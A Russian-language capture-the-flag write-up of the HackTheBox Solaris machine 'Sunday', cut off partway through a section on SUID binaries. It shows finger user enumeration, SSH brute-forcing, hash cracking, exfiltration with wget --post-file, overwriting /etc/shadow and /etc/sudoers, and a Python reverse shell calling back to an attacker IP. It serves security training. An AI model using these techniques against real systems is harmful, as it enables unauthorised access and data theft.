---
layout: post
title: "HTB: Sunday Write-Up"
date: 2018-10-09 22:00:00 +0300
author: snovvcrash
categories: ctf write-ups boxes hackthebox
tags: [ctf, write-ups, boxes, hackthebox, Sunday, solaris, finger, brute-force, patator, shadow, john, wget, sudoers]
comments: true
---

**Sunday** — простая машина на основе ОС Solaris. В ассортименте: древний net-протокол *Finger* для получения информации о залогиненных пользователях в качестве входной точки, брутфорс SSH-кредов, восстановление пароля соседнего пользователя по хешу (просим помощи у *Джона*) для первого PrivEsc'а и целая уйма способов получения рут-сессии через эксплуатацию *wget* для второго PrivEsc'а (попробуем все). Несмотря на то, что это правда одна из самых нетрудных тачек на HTB, большинство людей выбирали модификацию *shadow* / *sudoers* -файлов в качестве финального повышения привилегий, откуда непрекращающиеся сбои, ресеты и туча головной боли для вежливых хакеров. Рассмотрим же вместе этот временами бесящий, но от этого не менее веселый путь к победе над Sunday. **Сложность: 4.1/10**{:style="color:grey;"}

<!--cut-->

![sunday-banner.png]({{ "/img/htb/boxes/sunday/sunday-banner.png" | relative_url }})

<h4 style="color:red;margin-bottom:0;">Sunday: 10.10.10.76</h4>
<h4 style="color:red;">Attacker: 10.10.14.14</h4>

* TOC
{:toc}

# nmap
Initial:
```text
root@kali:~# nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial -p- 10.10.10.76
Increasing send delay for 10.10.10.76 from 0 to 5 due to 34 out of 111 dropped probes since last increase.
Increasing send delay for 10.10.10.76 from 5 to 10 due to 11 out of 21 dropped probes since last increase.
Increasing send delay for 10.10.10.76 from 10 to 20 due to 13 out of 42 dropped probes since last increase.
Increasing send delay for 10.10.10.76 from 20 to 40 due to 13 out of 41 dropped probes since last increase.
Warning: 10.10.10.76 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.76
Host is up, received user-set (0.048s latency).
Scanned at 2018-10-06 14:38:14 EDT for 139s
Not shown: 60087 filtered ports, 5443 closed ports
Reason: 60087 no-responses and 5443 resets
PORT      STATE SERVICE REASON
79/tcp    open  finger  syn-ack ttl 59
111/tcp   open  rpcbind syn-ack ttl 63
22022/tcp open  unknown syn-ack ttl 59
47581/tcp open  unknown syn-ack ttl 63
48935/tcp open  unknown syn-ack ttl 59

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Oct  6 14:40:33 2018 -- 1 IP address (1 host up) scanned in 139.31 seconds
```

Version ([красивый отчет]({{ "/nmap/htb-sunday-nmap-version.html" | relative_url }})):
```text
root@kali:~# nmap -n -vvv -sS -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/misc/nmap-bootstrap.xsl -p79,111,22022,47581,48935 10.10.10.76
Nmap scan report for 10.10.10.76
Host is up, received echo-reply ttl 254 (0.052s latency).
Scanned at 2018-10-06 14:48:07 EDT for 78s

PORT      STATE SERVICE   REASON         VERSION
79/tcp    open  finger    syn-ack ttl 59 Sun Solaris fingerd
| finger: Login       Name               TTY         Idle    When    Where\x0D
| sunny    sunny                 pts/2         34 Sat 17:38  10.10.13.96         \x0D
|_sunny    sunny                 pts/4       1:23 Sat 14:51  10.10.13.96         \x0D
111/tcp   open  rpcbind   syn-ack ttl 63 2-4 (RPC #100000)
22022/tcp open  ssh       syn-ack ttl 59 SunSSH 1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAKQhj2N5gfwsseuHbx/yCXwOkphQCTzDyXaBw5SHg/vRBW9aYPsWUUV0XGZPlVtbhxFylTZGNZTWJyndzQL3aRcQNouwVH8NnQsT63s4uLKsAP3jx4afAwB7049PvisAxtDVMbqg94vxaJkh88VY/EMpASYNrLFtr1mZngrbAzOvAAAAFQCiLK6Oh21fvEjgZ0Yl0IRtONW/wwAAAIAxz1u+bPH+VE7upID2HEvYksXOItmohsDFt0oHmGMHf9TKwZvqQLZRix0eXYu8zLnTIdg7rVYSjGyRhuWeIkl1+0aIJL4/dzB+JthInTGFIngc83MtonLP4Sj3YL20wL9etVh8/M0ZOedntWrQcUW+8cUWZRlgW8q620HZKE8VqAAAAIB0s8wn1ufviVEKXct60uz2ZoduUgg07dfPfzvhpbw232KYUJ6lchTj2p2AV8cD0fk2lok2Qc6Kn/OKSjO9C0PlvG8WWkVVvlISUY4BEhtqtL3aof7PYp5nCrLK+2v+grCLxOvyYpT1OfDMQbahOWGZ9OCwQtQXKP1wYEQMqMsSRg==
|   1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEAxAwq7HNZXHr7XEeYeKsbnaruPQyUK5IkSE/FxHesBaKQ37AsLjw8iacqUvcs8IuhPfiTtwuwU42zUHu1e1rmLpRlMyLQnjgJH1++fP5E0Qnxj4DrFr7aeRv1FqPkrnK/xCX46AdgUhs4+4YA04yfi8pOlaSEVucYaqWNhuqJkt8=
47581/tcp open  smserverd syn-ack ttl 63 1 (RPC #100155)
48935/tcp open  unknown   syn-ack ttl 59
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct  6 14:49:25 2018 -- 1 IP address (1 host up) scanned in 79.18 seconds
```

[Finger](https://ru.wikipedia.org/wiki/Finger "Finger — Википедия") на 79-м и SSH на non-дефолтном 22022-м портах. Начнем с исследования Finger.

# Finger — Порт 79
Если бы это была не открытая для всех желающих машина, и на ней не был бы в данный момент никто залогинен, то никакой информации из nmap-скриптов мы бы не получили. Сейчас же мы видим двух активных пользователей `sunny`. Однако, делая этот райтап, машина уже потеряла былую популярность, поэтому о существовании второго пользователя мы как раз не знаем. Это хорошо, потому что я все равно планировал показать выполнение брутфорса юзернеймов Finger протокола, поэтому предлагаю закрыть глаза на обнаружение пользователя `sunny`, и представить ситуацию, когда машиной занимаемся только мы.

В этом случае было бы примерно так:
```text
root@kali:~# finger @10.10.10.76
No one logged on
```

Если мы попробуем запросить информацию о конкретном пользователе, то возможны 2 исхода событий:
  1. Если пользователь существует, Finger вернет о нем информацию в том же виде, в котором она прилетела от NSE nmap'а (nmap делает ровно то же самое, что и мы утилитой `finger`).
  2. Если пользователя НЕ существует, произойдет следующее:

```text
root@kali:~# finger 3V1LH4CK3R@10.10.10.76
Login       Name               TTY         Idle    When    Where
3V1LH4CK3R            ???
```

Злых хакеров нет, поэтому и инфы о них нет. Загрубосилим Finger.

## Брутфорс Finger
Можно юзать модуль для Metasploit'а (`auxiliary/scanner/finger/finger_users`), а можно запустить [скрипт](https://github.com/pentestmonkey/finger-user-enum/blob/master/finger-user-enum.pl "finger-user-enum/finger-user-enum.pl at master · pentestmonkey/finger-user-enum") на Perl'е от pentestmonkey — результат будет один.

Воспользуемся вторым вариантом со словарем от [SecList](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt "SecLists/names.txt at master · danielmiessler/SecLists")'ов:
```text
root@kali:~# wget http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz
root@kali:~# tar -xvf finger-user-enum-1.0.tar.gz
root@kali:~# cd finger-user-enum-1.0
root@kali:~~/finger-user-enum-1.0# rm ../finger-user-enum-1.0.tar.gz
root@kali:~~/finger-user-enum-1.0# perl finger-user-enum.pl -U /usr/share/wordlists/SecLists/Usernames/Names/names.txt -t 10.10.10.76
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 5
Usernames file ........... /usr/share/wordlists/SecLists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10163
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used

######## Scan started at Sun Oct  7 08:57:50 2018 #########
access@10.10.10.76: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..uucp
anne marie@10.10.10.76: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
bin@10.10.10.76: bin             ???                         < .  .  .  . >..
dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..jo                    ???..ann                   ???..
la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..miof                  ???..mela                  ???..
sammy@10.10.10.76: sammy                 pts/2        <Apr 24 12:57> 10.10.14.4          ..
sunny@10.10.10.76: sunny                 pts/3        <Apr 24 10:48> 10.10.14.4          ..
sys@10.10.10.76: sys             ???                         < .  .  .  . >..
zsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
######## Scan completed at Sun Oct  7 09:03:50 2018 #########
14 results.

10163 queries in 394 seconds (25.8 queries / sec)
```

Среди кучи мусора видим 2 нужные строки:
```text
sammy@10.10.10.76: sammy                 pts/2        <Apr 24 12:57> 10.10.14.4          ..
sunny@10.10.10.76: sunny                 pts/3        <Apr 24 10:48> 10.10.14.4          ..
```

Контрольная проверка:
```text
root@kali:~# finger sammy@10.10.10.76
Login       Name               TTY         Idle    When    Where
sammy    sammy                 pts/2        <Apr 24 12:57> 10.10.14.4

root@kali:~# finger sunny@10.10.10.76
Login       Name               TTY         Idle    When    Where
sunny    sunny                 pts/3        <Apr 24 10:48> 10.10.14.4
```

Итак, у нас есть 2 пользователя: *sammy* и *sunny*.

# SSH — Порт 22022 (внутри машины)
Будем отталкиваться от того, что имеем, а кроме 2-х юзернеймов у нас ничего нет. Поэтому помимо брута SSH-кредов для кого-то из них сложно что-либо придумать.

Начнем с *sunny*, т. к. имя коррелирует с названием машины. Есть такая практика на HTB — там, где нужно угадать пароль, ставить в качестве пароля название машины, либо что-то с ним созвучное. Поэтому мы могли бы просто попробовать приконнектиться с паролем `sunday` (и эта попытка увенчалась бы успехом с вероятностью 99 %), но какой же тогда интерес?

Набросаем список вероятных парольных фраз для пататора и забрутим SSH:
```text
root@kali:~# cat sunny_pass.lst
sammy
sunny
Sun
sun
Solaris
solaris
SunSSH
sunssh
HTB
htb
hackthebox
Sunday
sunday
```

```text
root@kali:~# patator ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE0 0=./sunny_pass.lst -x ignore:mesg='Authentication failed.'
13:23:14 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2018-10-10 13:23 EDT
13:23:14 patator    INFO -
13:23:14 patator    INFO - code  size    time | candidate                          |   num | mesg
13:23:14 patator    INFO - -----------------------------------------------------------------------------
13:23:16 patator    INFO - 0     19     0.104 | sunday                             |    13 | SSH-2.0-Sun_SSH_1.3
13:23:17 patator    INFO - Hits/Done/Skip/Fail/Size: 1/13/0/0/13, Avg: 4 r/s, Time: 0h 0m 3s
```

Теперь с чистой совестью логинемся с `sunny:sunday` и сразу в бой:
```text
root@kali:~# sshpass -p 'sunday' ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oStrictHostKeyChecking=no -p 22022 sunny@10.10.10.76
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sunny@sunday:~$ whoami
sunny

sunny@sunday:~$ id
uid=65535(sunny) gid=1(other) groups=1(other)

sunny@sunday:~$ uname -a
SunOS sunday 5.11 snv_111b i86pc i386 i86pc Solaris
```

```text
sunny@sunday:~$ sudo -l
User sunny may run the following commands on this host:
    (root) NOPASSWD: /root/troll

sunny@sunday:~$ sudo /root/troll
testing
uid=0(root) gid=0(root)
```

Запомнили `/root/troll`, используем его позже; user-флага не видно, но я догадываюсь, где он есть:
```text
sunny@sunday:~$ pwd
/export/home/sunny

sunny@sunday:~$ ls -la /export/home/
total 8
drwxr-xr-x  4 root  root   4 2018-04-15 20:18 .
drwxr-xr-x  3 root  root   3 2018-04-15 19:44 ..
drwxr-xr-x 18 sammy staff 26 2018-04-24 11:24 sammy
drwxr-xr-x 18 sunny other 30 2018-04-15 20:52 sunny
```

## PrivEsc: sunny → sammy
Для PrivEsc'а до *sammy* достаточно обнаружить директорию `/backup`:
```text
sunny@sunday:~$ ls -la /
total 527
drwxr-xr-x 26 root root     27 2018-04-24 12:57 .
drwxr-xr-x 26 root root     27 2018-04-24 12:57 ..
drwxr-xr-x  2 root root      4 2018-04-15 20:44 backup
lrwxrwxrwx  1 root root      9 2018-04-15 19:52 bin -> ./usr/bin
drwxr-xr-x  6 root sys       7 2018-04-15 19:52 boot
drwxr-xr-x  2 root root      2 2018-04-16 15:33 cdrom
drwxr-xr-x 81 root sys     265 2018-10-07 13:44 dev
drwxr-xr-x  4 root sys      10 2018-10-07 13:44 devices
drwxr-xr-x 77 root sys     224 2018-10-07 13:44 etc
drwxr-xr-x  3 root root      3 2018-04-15 19:44 export
dr-xr-xr-x  1 root root      1 2018-10-07 13:44 home
drwxr-xr-x 19 root sys      20 2018-04-15 19:45 kernel
drwxr-xr-x 10 root bin     180 2018-04-15 19:45 lib
drwx------  2 root root      2 2009-05-14 21:27 lost+found
drwxr-xr-x  2 root root      4 2018-10-07 13:44 media
drwxr-xr-x  2 root sys       2 2018-04-15 19:52 mnt
dr-xr-xr-x  1 root root      1 2018-10-07 13:44 net
drwxr-xr-x  4 root sys       4 2018-04-15 19:52 opt
drwxr-xr-x  5 root sys       5 2009-05-14 21:21 platform
dr-xr-xr-x 52 root root 480032 2018-10-07 15:09 proc
drwx------  6 root root     13 2018-04-24 10:31 root
drwxr-xr-x  4 root root      4 2018-04-15 19:52 rpool
drwxr-xr-x  2 root sys      58 2018-04-15 19:53 sbin
drwxr-xr-x  4 root root      4 2009-05-14 21:18 system
drwxrwxrwt  4 root sys     384 2018-10-07 13:45 tmp
drwxr-xr-x 30 root sys      44 2018-04-15 19:46 usr
drwxr-xr-x 35 root sys      35 2018-04-15 20:26 var

sunny@sunday:~$ ls -la /backup/
total 5
drwxr-xr-x  2 root root   4 2018-04-15 20:44 .
drwxr-xr-x 26 root root  27 2018-04-24 12:57 ..
-r-x--x--x  1 root root  53 2018-04-24 10:35 agent22.backup
-rw-r--r--  1 root root 319 2018-04-15 20:44 shadow.backup
```

И прочитать `shadow.backup`:
```text
sunny@sunday:~$ cat /backup/shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

После чего заглянем в `/etc/passwd`:
```text
sunny@sunday:~$ cat /etc/passwd
root:x:0:0:Super-User:/root:/usr/bin/bash
daemon:x:1:1::/:
bin:x:2:2::/usr/bin:
sys:x:3:3::/:
adm:x:4:4:Admin:/var/adm:
lp:x:71:8:Line Printer Admin:/usr/spool/lp:
uucp:x:5:5:uucp Admin:/usr/lib/uucp:
nuucp:x:9:9:uucp Admin:/var/spool/uucppublic:/usr/lib/uucp/uucico
dladm:x:15:3:Datalink Admin:/:
smmsp:x:25:25:SendMail Message Submission Program:/:
listen:x:37:4:Network Admin:/usr/net/nls:
gdm:x:50:50:GDM Reserved UID:/:
zfssnap:x:51:12:ZFS Automatic Snapshots Reserved UID:/:/usr/bin/pfsh
xvm:x:60:60:xVM User:/:
mysql:x:70:70:MySQL Reserved UID:/:
openldap:x:75:75:OpenLDAP User:/:
webservd:x:80:80:WebServer Reserved UID:/:
postgres:x:90:90:PostgreSQL Reserved UID:/:/usr/bin/pfksh
svctag:x:95:12:Service Tag UID:/:
nobody:x:60001:60001:NFS Anonymous Access User:/:
noaccess:x:60002:60002:No Access User:/:
nobody4:x:65534:65534:SunOS 4.x NFS Anonymous Access User:/:
sammy:x:101:10:sammy:/export/home/sammy:/bin/bash
sunny:x:65535:1:sunny:/export/home/sunny:/bin/bash
```

И скрафтим файл для Джона, который так любезно согласился восстановить для нас пароль *sammy*:
```text
root@kali:~# echo 'sammy:x:101:10:sammy:/export/home/sammy:/bin/bash' > sammy_passwd
root@kali:~# echo 'sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::' > sammy_shadow
root@kali:~# unshadow sammy_passwd sammy_shadow > sammy_hash

root@kali:~# john sammy_hash --wordlist=/usr/share/wordlists/rockyou.txt --format=sha256crypt
Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 128/128 AVX 4x])
No password hashes left to crack (see FAQ)

root@kali:~# john sammy_hash --show
sammy:cooldude!:101:10:sammy:/export/home/sammy:/bin/bash

1 password hash cracked, 0 left
```

Сменим пользователя на `sammy:cooldude!`:
```text
sunny@sunday:~$ su - sammy
Password: cooldude!
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sammy@sunday:~$ pwd
/export/home/sammy

sammy@sunday:~$ whoami
sammy

sammy@sunday:~$ id
uid=101(sammy) gid=10(staff) groups=10(staff)
```

### user.txt
И заберем флаг:
```text
sammy@sunday:~$ cat Desktop/user.txt
a3d94980????????????????????????
```

## PrivEsc: sammy → root
```text
sammy@sunday:~$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
```

Иии... [wget](https://www.opennet.ru/man.shtml?topic=wget&category=1&russian=2 "Проект OpenNet: MAN wget (1) Команды и прикладные программы пользовательского уровня (FreeBSD и Linux)") можно выполнять от рута: это знание сулит нам целых 7 различных способов PrivEsc'а! Разберем их все, расположив по возрастанию трудозатратности.

### 1. wget --input-file
Самым очевидным для меня способом прочтения root-флага (а также самым быстрым) стало использование флага `--input-file`, или просто `-i`.

#### root.txt
В случае использования этой опции wget будет ожидать от нас файла с URL, с которым нужно работать. Ну а если мы укажем любой другой файл (с флагом, например :smiling_imp:), то будет спровоцирована ошибка при которой содержимое файла будет выведено на экран:
```text
sammy@sunday:~$ sudo /usr/bin/wget -i /root/root.txt
/root/root.txt: Invalid URL fb40fab6????????????????????????: Unsupported scheme
No URLs found in /root/root.txt.
```

Элегантно и просто.

### 2. wget --post-file
Можно отправить флаг через POST-запрос.

Дефолтный `python -m SimpleHTTPServer`, он же `python3 -m http.server`, не подойдет по причине неумения работать с POST-методами. Здесь есть 2 выхода из ситуации.

1\. Принимаем запрос через `nc`, т. к. нам нужно только увидеть содержимое, отвечать необязательно:
```text
sammy@sunday:~$ sudo /usr/bin/wget --post-file /root/root.txt 10.10.14.14:8881
--19:36:38--  http://10.10.14.14:8881/
           => `index.html.1'
Connecting to 10.10.14.14:8881... connected.
HTTP request sent, awaiting response... ^C
```

```text
root@kali:~# nc -nlvvp 8881
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::8881
Ncat: Listening on 0.0.0.0:8881
Ncat: Connection from 10.10.10.76.
Ncat: Connection from 10.10.10.76:51996.

POST / HTTP/1.0
User-Agent: Wget/1.10.2
Accept: */*
Host: 10.10.14.14:8881
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

fb40fab6????????????????????????
NCAT DEBUG: Closing fd 5.
```

2\. Дописать на коленке обработку POST-запросов (отображение содержимого) для Python-сервера, это тоже нетрудно:
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Usage: python3 SimpleHTTPServer+.py [-h] [--bind ADDRESS] [port]

import http.server
import os

from argparse import ArgumentParser


class HTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
	def _set_headers(self):
		self.send_response(200)
		self.send_header('Content-type', 'text/html')
		self.end_headers()

	def do_POST(self):
		content_length = int(self.headers['Content-Length'])
		post_data = self.rfile.read(content_length)
		self._set_headers()
		self.wfile.write(b'<html><body><h1>POST!</h1></body></html>')

		print(post_data.decode('utf-8'))


def cli_options():
	parser = ArgumentParser()

	parser.add_argument(
		'--bind',
		'-b',
		default='',
		metavar='ADDRESS',
		help='Specify alternate bind address [default: all interfaces]'
	)

	parser.add_argument(
		'port',
		action='store',
		default=8000,
		type=int,
		nargs='?',
		help='Specify alternate port [default: 8000]'
	)

	return parser.parse_args()


if __name__ == '__main__':
	args = cli_options()
	http.server.test(HandlerClass=HTTPRequestHandler, port=args.port, bind=args.bind)
```

```text
sammy@sunday:~$ sudo /usr/bin/wget --post-file /root/root.txt 10.10.14.14:8881
--19:22:14--  http://10.10.14.14:8881/
           => `index.html'
Connecting to 10.10.14.14:8881... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]

    [ <=>                                                 ] 40            --.--K/s

19:22:14 (2.55 MB/s) - `index.html' saved [40]
```

```text
root@kali:~# python3 SimpleHTTPServer+.py 8881
Serving HTTP on 0.0.0.0 port 8881 (http://0.0.0.0:8881/) ...
10.10.10.76 - - [07/Oct/2018 15:22:13] "POST / HTTP/1.0" 200 -
fb40fab6????????????????????????

^C
Keyboard interrupt received, exiting.
```

### 3. /etc/shadow (/etc/passwd)
Модификация `/etc/shadow` (`/etc/passwd`) / `/etc/sudoers` — два способа, которые нужно выполнять с крайней осторожностью: велика вероятность подвесить машину (чем, кстати, не прекращали заниматься люди на HTB :angry:). Нельзя, к примеру, просто изменить `UID:GID` одного из пользователей на `0:0` в `/etc/passwd` и ожидать, что в SunOS таким образом ты получишь root-сессию. Рассмотрим *легальный* пример изменения **shadow (passwd)** -файлов, которые приведут к желаемой цели. Но сперва немного теории.

**SunOS** (aka *Solaris*) — операционная система с [ролевым разграничением доступа](https://ru.wikipedia.org/wiki/Управление_доступом_на_основе_ролей) (англ. *Role Based Access Control*, *RBAC*), где под "ролью" понимается то, кем данный пользователь может стать (роль — это *маска на карнавале*; пользователь надевает маску и превращается в того, чью маску (роль) он выбрал). Список ролей для обычных пользователей изначально пуст. Проверить, в кого нам "разрешено превратиться" можно с помощью команды `roles`:
```text
sunny@sunday:~$ roles
No roles

sunny@sunday:~$ roles sammy
root
```

*sunny* не сможет надеть маску root'а, это под силу только *sammy*. Именно поэтому бесполезно менять `UID:GID` существующих пользователей, ровно как и добавлять новых — ведь их в списке ролей не будет и подавно. Подробнее почитать про RBAC можно [здесь](https://blogs.oracle.com/solaris/understading-rbac-v2 "Understading RBAC / Oracle Solaris Blog").

Единственным приемлемым способом из этой категории я вижу модификацию файла `/etc/shadow` добавлением записи с известным паролем для root-пользователя.

Для этого сгенерируем новый пароль `qwe123!@#`:
```text
root@kali:~# openssl passwd -1 -salt sugar 'qwe123!@#'
$1$sugar$XYG/x4tZyZcCFe2QdDiSa1
```

И создадим файл `shadow` с содержимым (все как в `/backup/shadow.backup` за исключением первой строки):
```text
root:$1$sugar$XYG/x4tZyZcCFe2QdDiSa1:::::::
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

Теперь закинем измененный `shadow` на Sunday:
```text
sammy@sunday:~$ sudo /usr/bin/wget 10.10.14.14:8881/shadow -O /etc/shadow
--21:39:47--  http://10.10.14.14:8881/shadow
           => `/etc/shadow'
Connecting to 10.10.14.14:8881... connected.
HTTP request sent, awaiting response... 200 OK
Length: 363 [application/octet-stream]

100%[=================================================>] 363           --.--K/s

21:39:47 (23.38 MB/s) - `/etc/shadow' saved [363/363]
```

И ~~поимеем~~ инициируем root-сессию:
```text
sammy@sunday:~$ su -
Password: qwe123!@#
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
You have new mail.
root@sunday:~# whoami
root

root@sunday:~# id
uid=0(root) gid=0(root) groups=0(root),1(other),2(bin),3(sys),4(adm),5(uucp),6(mail),7(tty),8(lp),9(nuucp),12(daemon)
```

```text
root@sunday:~# cat /root/root.txt
fb40fab6????????????????????????
```

В обычной Linux-системе можно было бы даже не трогать `/etc/shadow`, а просто изменить root-запись в `/etc/passwd` на такую:
```text
root:$1$sugar$XYG/x4tZyZcCFe2QdDiSa1:0:0:Super-User:/root:/usr/bin/bash
...
```

Тогда пароль запрашивался бы не из `/etc/shadow` (на что намекала буква `x`), а прямо из файла `passwd`. Однако в Solaris'е так делать нельзя.

### 4. /etc/sudoers
Теперь перезапишем файл `/etc/sudoers`, отвечающий за конфигурацию команды `sudo`.

Так как изначально у нас нет доступа для просмотра sudoers:
```text
sammy@sunday:~$ ls -la /etc/sudoers
-r--r----- 1 root root 795 2018-04-15 20:23 /etc/sudoers
```

То, я *предположу*, что в оригинале он выглядит примерно так:
```text
root     ALL=(ALL) ALL
sunny    ALL=(root) NOPASSWD: /root/troll
sammy    ALL=(root) NOPASSWD: /usr/bin/wget
```

Добавим строчку в конец, благодаря которой мы сможем сменить пользователя на привилегированного от имени *sammy* без пароля:
```text
root     ALL=(ALL) ALL
sunny    ALL=(root) NOPASSWD: /root/troll
sammy    ALL=(root) NOPASSWD: /usr/bin/wget

sammy    ALL=(root) NOPASSWD: /usr/bin/su
```

Скачаем отредактированный файл и запустим `su`:
```text
sammy@sunday:~$ sudo /usr/bin/wget 10.10.14.14:8881/sudoers -O /etc/sudoers
--10:32:16--  http://10.10.14.14:8881/sudoers
           => `/etc/sudoers'
Connecting to 10.10.14.14:8881... connected.
HTTP request sent, awaiting response... 200 OK
Length: 152 [application/octet-stream]

100%[=================================================>] 152           --.--K/s

10:32:16 (9.64 MB/s) - `/etc/sudoers' saved [152/152]


sammy@sunday:~$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
    (root) NOPASSWD: /usr/bin/su

sammy@sunday:~$ sudo /usr/bin/su -
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
You have new mail.
root@sunday:~# whoami
root

root@sunday:~# id
uid=0(root) gid=0(root) groups=0(root),1(other),2(bin),3(sys),4(adm),5(uucp),6(mail),7(tty),8(lp),9(nuucp),12(daemon)
```

```text
root@sunday:~# cat /root/root.txt
fb40fab6????????????????????????
```

По мне так это самый неблагородный путь повышения привилегий — можно спойлернуть удовольствие другим :fearful:

### 5. /root/troll

Особенно забавным было попробовать этот способ PrivEsc'а.

Начинается он как обычно — с подмены файла `/root/troll`, который, как мы помним, может быть запущен *sunny* с правами админа:
```text
sammy@sunday:~$ sudo /usr/bin/wget 10.10.14.14:8881/sh3ll.py -O /root/troll
--11:10:06--  http://10.10.14.14:8881/sh3ll.py
           => `/root/troll'
Connecting to 10.10.14.14:8881... connected.
HTTP request sent, awaiting response... 200 OK
Length: 363 [application/octet-stream]

100%[=================================================>] 291           --.--K/s

11:10:06 (605.54 KB/s) - `/root/troll' saved [291/291]
```

Загрузили мы, в свою очередь, этот питоновский reverse-shell (`sh3ll.py`, на скриншоте чуть ниже он назван `troll`):
```python
#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket, os, pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.14.14', 31337))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
os.putenv('HISTFILE', '/dev/null')
pty.spawn('/bin/bash')
s.close()
```

Дальше после выполнения `sudo /root/troll` от имени *sunny* получили коннект на локальном слушателе:
```text
root@kali:~# nc -nlvvp 8881
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::8881
Ncat: Listening on 0.0.0.0:8881
Ncat: Connection from 10.10.10.76.
Ncat: Connection from 10.10.10.76:58847.

root@sunday:~# whoami
whoami
root

root@sunday:~# id
id
uid=0(root) gid=0(root) groups=0(root),1(other),2(bin),3(sys),4(adm),5(uucp),6(mail),7(tty),8(lp),9(nuucp),12(daemon)
```

```text
root@sunday:~# cat /root/root.txt
cat /root/root.txt
fb40fab6????????????????????????
```

Если получилось с первого раза, значит очень повезло: как будет видно в конце райтапа (см. [Разное/overwrite]({{ page.url }}#overwrite)), `/root/troll` перезаписывается каждые 5 секунд :joy:

Вот так все выглядело вживую (красным указан порядок активности панелей):

[![sunday-root-troll.png]({{ "/img/htb/boxes/sunday/sunday-root-troll.png" | relative_url }})]({{ "/img/htb/boxes/sunday/sunday-root-troll.png" | relative_url }})

### 6. Исполняемый файл с SUID
Еще один способ, если не хочется попадать в тайминги troll'а, — это перезапись любого исполняемого файла с выставленным SUID'ом и владельцем root.

Найти их все, кстати, можно с помощью `find`:
```text
sammy@sunday:~$ find /usr/bin -perm -u=s -user root -type f 2>/dev/null
/usr/bin/sys-suspend
/usr/bin/rsh
/usr/bin/crontab
/usr/bin/rdist
/usr/bin/sudo
/usr/bin/lpset
/usr/bin/amd64/w
/usr/bin/amd64/uptime
/usr/bin/amd64/newtask
/usr/bin/chkey
/usr/bin/login
/usr/bin/pfexec
/usr/bin/newgrp
/usr/bin/mailq
/usr/bin/rlogin
/usr/bin/pppd
/usr/bin/atq
/usr/bin/rcp
/usr/bin/rmformat
